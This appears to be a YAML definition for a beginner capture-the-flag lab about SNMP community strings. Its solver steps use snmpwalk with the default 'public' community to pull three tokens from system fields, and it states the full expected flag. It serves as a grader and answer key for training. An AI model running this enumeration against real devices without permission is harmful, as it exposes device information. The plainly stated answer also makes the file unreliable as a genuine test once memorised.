lab_id: linux-2-8-snmp-community-strings
track: Linux
difficulty: beginner
source: platform/labs/Linux/linux-2-8-snmp-community-strings/lab.yaml
expected_services:
- port: 161
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr-tester:latest
  command: /tests/linux-2-8-snmp-community-strings.sh
  steps:
  - name: SNMP port 161 is accessible
    command: snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | head -1
    expect: Greystone
  - name: Extract token 1 from sysDescr
    command: 'snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | grep -o ''Token: [a-z0-9_]*'' | awk ''{print $2}'''
    expect: snmp
  - name: Extract token 2 from sysLocation
    command: 'snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.6.0 2>&1 | grep -o ''Token: [a-z0-9_]*'' | awk ''{print $2}'''
    expect: w4lk
  - name: Extract token 3 from sysContact
    command: 'snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o ''Token: [a-z0-9_]*'' | awk ''{print $2}'''
    expect: c0mmun1ty
  - name: Verify complete flag
    command: echo 'OCR{snmp_w4lk_c0mmun1ty}'
    expect: OCR{snmp_w4lk_c0mmun1ty}
expected_flag_count: 1
expected_flag: OCR{snmp_w4lk_c0mmun1ty}
